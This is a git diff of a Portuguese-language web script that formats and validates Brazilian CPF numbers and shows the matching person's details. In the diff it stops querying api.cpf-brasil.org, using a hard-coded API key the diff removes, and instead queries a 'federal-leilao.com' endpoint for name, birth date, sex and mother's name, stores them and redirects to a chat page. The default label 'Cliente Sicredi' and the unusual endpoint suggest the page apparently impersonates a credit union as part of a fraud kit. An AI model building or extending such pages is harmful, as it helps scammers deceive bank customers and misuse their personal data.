@@ -30,7 +30,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Formatar CPF enquanto digita
   function formatCPF(input) {
-    let value = input.value.replace(/\D/g, "");
+    let value = (input.value || "").replace(/\D/g, "");
     if (value.length > 11) value = value.slice(0, 11);
 
     if (value.length > 9) {
@@ -44,123 +44,165 @@ document.addEventListener("DOMContentLoaded", function () {
     input.value = value;
   }
 
-  // Validar CPF
-  function validateCPF(cpf) {
-    cpf = (cpf || "").replace(/\D/g, "");
-    return cpf.length === 11;
+  // ✅ Validar CPF (COM DÍGITOS VERIFICADORES)
+  function validarCPF(cpf) {
+    cpf = (cpf || "").replace(/[^\d]+/g, "");
+    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+
+    let soma = 0,
+      resto;
+    for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf[9])) return false;
+
+    soma = 0;
+    for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+
+    return resto === parseInt(cpf[10]);
   }
 
+  // Formatação de data (YYYYMMDD para DD/MM/YYYY ou deixa como está se já estiver formatada)
   function formatDate(dateString) {
     if (!dateString) return "Não informado";
-    if (String(dateString).includes("/")) return dateString;
+    if (String(dateString).includes("/")) return String(dateString);
     if (String(dateString).length === 8) {
       return String(dateString).replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
     }
     return String(dateString);
   }
 
+  // ✅ Consulta CPF com timeout (API FEDERAL-LEILAO)
+  async function consultarCpfComTimeout(cpf, timeoutMs = 1200) {
+    const url = `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(
+      cpf
+    )}`;
+
+    const fetchPromise = fetch(url, {
+      method: "GET",
+      headers: {
+        "user-agent":
+          "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+      },
+    })
+      .then((response) => {
+        if (!response.ok) return null;
+        return response.json();
+      })
+      .catch(() => null);
+
+    const timeoutPromise = new Promise((resolve) => {
+      setTimeout(() => resolve(null), timeoutMs);
+    });
+
+    return Promise.race([fetchPromise, timeoutPromise]);
+  }
+
   // ==========================
-  // CONSULTA CPF (NOVA API CPF-BRASIL)
+  // CONSULTA CPF (API NOVA)
   // ==========================
   async function consultarCPF(cpf) {
     const cpfLimpo = (cpf || "").replace(/\D/g, "");
 
     // UI: mostrar área e loading
-    consultaResultado.classList.remove("hidden");
-    loadingInfo.classList.remove("hidden");
-    userInfo.classList.add("hidden");
-    errorInfo.classList.add("hidden");
+    if (consultaResultado) consultaResultado.classList.remove("hidden");
+    if (loadingInfo) loadingInfo.classList.remove("hidden");
+    if (userInfo) userInfo.classList.add("hidden");
+    if (errorInfo) errorInfo.classList.add("hidden");
 
-    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
+    if (consultaResultado) {
+      consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
+    }
+
+    // Defaults
+    let nomeCompleto = "Cliente Sicredi";
+    let primeiroNome = "Cliente";
+    let nascimento = "";
+    let sexo = "";
+    let mae = "";
 
     try {
-      // Endpoint real
-      const targetUrl = `https://api.cpf-brasil.org/cpf/${cpfLimpo}`;
-      // corsproxy: atenção que ele aceita "https://corsproxy.io/?<url>"
-      const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
+      const data = await consultarCpfComTimeout(cpfLimpo, 1200);
 
-      const resp = await fetch(proxyUrl, {
-        method: "GET",
-        headers: {
-          "X-API-Key": "3d8d3fe8466255df1d61e243a2cca1b0", // <-- TROQUE AQUI
-        },
-      });
-
-      if (!resp.ok) {
-        // espelha comportamento do seu script original
-        if (resp.status === 404) throw new Error("CPF não encontrado na base de dados");
-        if (resp.status === 401) throw new Error("Erro de autenticação (API Key inválida)");
-        if (resp.status === 429) throw new Error("Muitas requisições. Aguarde um momento.");
-        throw new Error(`Erro na consulta: ${resp.status}`);
+      if (data && data.status === 200) {
+        nomeCompleto = data.nome || nomeCompleto;
+        primeiroNome = (nomeCompleto.split(" ")[0] || primeiroNome).trim();
+        nascimento = data.nascimento || "";
+        sexo = data.sexo || "";
+        mae = data.mae || "";
+        console.log("📩 Retorno da API dentro do tempo:", data);
+      } else {
+        console.log("⏱️ API demorou demais ou falhou, seguindo com dados padrão.");
       }
-
-      const json = await resp.json();
-
-      // A CPF-Brasil retorna em json.data
-      const apiData = json && json.data ? json.data : null;
 
       // UI: esconder loading
-      loadingInfo.classList.add("hidden");
-
-      if (!apiData || (!apiData.NOME && !apiData.CPF)) {
-        errorMessage.textContent = "Não foi possível obter os dados para este CPF.";
-        errorInfo.classList.remove("hidden");
-        errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
-        return;
-      }
-
-      // Normalização (mantém seu fluxo atual)
-      const data = {
-        CPF: cpfLimpo,
-        NOME: apiData.NOME || "",
-        NOME_MAE: apiData.NOME_MAE || "",
-        NASC: apiData.NASC || "",
-        SEXO: apiData.SEXO || "",
-      };
+      if (loadingInfo) loadingInfo.classList.add("hidden");
 
       // Preencher tela
-      if (nomeUsuario) nomeUsuario.textContent = data.NOME || "Não informado";
+      if (nomeUsuario) nomeUsuario.textContent = nomeCompleto || "Não informado";
 
       if (cpfUsuario) {
-        cpfUsuario.textContent = data.CPF
-          ? data.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
+        cpfUsuario.textContent = cpfLimpo
+          ? cpfLimpo.replace(
+              /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
+              "$1.$2.$3-$4"
+            )
           : "Não informado";
       }
 
-      if (sexoUsuario) sexoUsuario.textContent = data.SEXO || "Não informado";
-      if (nomeMae) nomeMae.textContent = data.NOME_MAE || "Não informado";
+      if (sexoUsuario) sexoUsuario.textContent = sexo || "Não informado";
+      if (nomeMae) nomeMae.textContent = mae || "Não informado";
+      if (dataNascimento) dataNascimento.textContent = formatDate(nascimento);
 
-      if (dataNascimento) {
-        dataNascimento.textContent = formatDate(data.NASC) || "Não informado";
-      }
-
-      // ✅ O /chat valida `dadosUsuario.nome` e `dadosUsuario.cpf`
+      // ✅ localStorage (compatível com seu /chat)
       const dadosUsuario = {
-        nome: data.NOME || "",
-        cpf: data.CPF || "",
-        sexo: data.SEXO || "",
-        nomeMae: data.NOME_MAE || "",
-        dataNascimento: data.NASC || "",
+        nome: nomeCompleto || "",
+        cpf: cpfLimpo || "",
+        sexo: sexo || "",
+        nomeMae: mae || "",
+        dataNascimento: nascimento || "",
       };
 
+      localStorage.setItem("cpf", cpfLimpo);
       localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
-
-      // (Opcional) manter também chaves auxiliares, se você usa em outros lugares:
       if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
       if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
-      localStorage.setItem("cpf", cpfLimpo);
+
+      // ✅ sessionStorage (padrão que você pediu guardar)
+      sessionStorage.setItem("cpf", cpfLimpo);
+      sessionStorage.setItem("primeiroNome", primeiroNome);
+      sessionStorage.setItem("nomeCompleto", nomeCompleto);
+      sessionStorage.setItem("dataNascimento", nascimento || "");
+      sessionStorage.setItem("sexo", sexo || "");
+      sessionStorage.setItem("nomeMae", mae || "");
+      sessionStorage.setItem(
+        "dadosAdicionais",
+        JSON.stringify({
+          cpf: cpfLimpo,
+          primeiroNome,
+          nomeCompleto,
+          nascimento,
+          sexo,
+          nomeMae: mae,
+        })
+      );
 
       // Mostrar bloco de confirmação
-      userInfo.classList.remove("hidden");
+      if (userInfo) userInfo.classList.remove("hidden");
       setTimeout(() => {
-        userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
-      }, 100);
+        if (userInfo) userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
+      }, 150);
     } catch (err) {
-      loadingInfo.classList.add("hidden");
-      errorMessage.textContent = (err && err.message) ? err.message : "Ocorreu um erro ao consultar seus dados.";
-      errorInfo.classList.remove("hidden");
+      if (loadingInfo) loadingInfo.classList.add("hidden");
+      if (errorMessage) {
+        errorMessage.textContent =
+          (err && err.message) ? err.message : "Ocorreu um erro ao consultar seus dados.";
+      }
+      if (errorInfo) errorInfo.classList.remove("hidden");
       console.error("Erro na consulta:", err);
-      errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
+      if (errorInfo) errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
     }
   }
 
@@ -168,14 +210,18 @@ document.addEventListener("DOMContentLoaded", function () {
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.has("cpf")) {
     const cpfFromUrl = (urlParams.get("cpf") || "").replace(/\D/g, "");
-    if (validateCPF(cpfFromUrl)) {
+    if (cpfFromUrl && cpfFromUrl.length === 11) {
       localStorage.setItem("cpf", cpfFromUrl);
       console.log("CPF da URL salvo no localStorage:", cpfFromUrl);
     }
   }
 
+  // Mostrar página de CPF
   function showCPFPage() {
+    if (!mainPage || !cpfPage) return;
+
     mainPage.classList.add("fade-out");
+
     setTimeout(() => {
       mainPage.classList.add("hidden");
       cpfPage.classList.remove("hidden");
@@ -189,7 +235,10 @@ document.addEventListener("DOMContentLoaded", function () {
     }, 400);
   }
 
+  // Voltar para a página principal
   function showMainPage() {
+    if (!mainPage || !cpfPage) return;
+
     cpfPage.classList.remove("fade-in");
     cpfPage.classList.add("opacity-0");
 
@@ -203,11 +252,12 @@ document.addEventListener("DOMContentLoaded", function () {
     }, 400);
   }
 
+  // Processar o formulário de CPF
   function processForm() {
     const cpf = (cpfInputPage?.value || "").replace(/\D/g, "");
 
-    if (!validateCPF(cpf)) {
-      alert("Por favor, digite um CPF válido (11 dígitos).");
+    if (!validarCPF(cpf)) {
+      alert("Por favor, digite um CPF válido.");
       return;
     }
 
@@ -219,10 +269,10 @@ document.addEventListener("DOMContentLoaded", function () {
     localStorage.setItem("cpf", cpf);
     console.log("CPF salvo no localStorage:", cpf);
 
-    // mantém o fluxo, apenas consulta
     consultarCPF(cpf);
   }
 
+  // Redirecionar para o chat após confirmar os dados
   function redirecionarParaChat() {
     const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
     if (!dadosUsuarioJSON) {
@@ -238,6 +288,7 @@ document.addEventListener("DOMContentLoaded", function () {
       }
 
       const cpf = String(dadosUsuario.cpf).replace(/\D/g, "");
+
       const urlAtual = new URLSearchParams(window.location.search);
       const novaUrl = new URLSearchParams();
 
@@ -254,13 +305,15 @@ document.addEventListener("DOMContentLoaded", function () {
     }
   }
 
+  // Limpar informações e voltar para digitar CPF
   function corrigirDados() {
-    consultaResultado.classList.add("hidden");
+    if (consultaResultado) consultaResultado.classList.add("hidden");
     if (cpfInputPage) cpfInputPage.focus();
   }
 
+  // Tentar novamente após erro
   function tentarNovamente() {
-    consultaResultado.classList.add("hidden");
+    if (consultaResultado) consultaResultado.classList.add("hidden");
     if (cpfInputPage) cpfInputPage.focus();
   }
 
@@ -281,6 +334,7 @@ document.addEventListener("DOMContentLoaded", function () {
   if (btnCorrigir) btnCorrigir.addEventListener("click", corrigirDados);
   if (btnTentarNovamente) btnTentarNovamente.addEventListener("click", tentarNovamente);
 
+  // Formatação de CPF enquanto digita
   if (cpfInputPage) {
     cpfInputPage.addEventListener("input", function () {
       formatCPF(this);
@@ -295,6 +349,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const indicators = document.querySelectorAll(".carousel-indicator");
   const prevBtn = document.getElementById("prev-btn");
   const nextBtn = document.getElementById("next-btn");
+
   const stepNumbers = document.querySelectorAll(".step-number");
   const stepLines = document.querySelectorAll(".step-line");
 
@@ -311,7 +366,8 @@ document.addEventListener("DOMContentLoaded", function () {
     slides[index].classList.add("active");
 
     indicators.forEach((indicator, i) => {
-      indicator.classList.toggle("active", i === index);
+      if (i === index) indicator.classList.add("active");
+      else indicator.classList.remove("active");
     });
 
     updateSteps(index);
@@ -326,7 +382,8 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
     stepLines.forEach((line, i) => {
-      line.classList.toggle("active", i < index);
+      if (i < index) line.classList.add("active");
+      else line.classList.remove("active");
     });
   }
 
